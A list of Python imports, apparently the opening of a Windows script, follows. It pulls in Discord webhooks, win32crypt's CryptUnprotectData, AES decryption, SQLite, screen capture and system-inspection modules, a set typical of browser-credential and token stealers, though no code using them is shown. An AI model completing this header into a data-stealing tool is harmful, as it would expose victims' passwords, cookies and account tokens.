import os
import platform
import re
import threading
import uuid
import requests
import wmi
import subprocess
import sqlite3
import psutil
import json
import base64
from tkinter import messagebox
from shutil import copy2
from zipfile import ZipFile
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
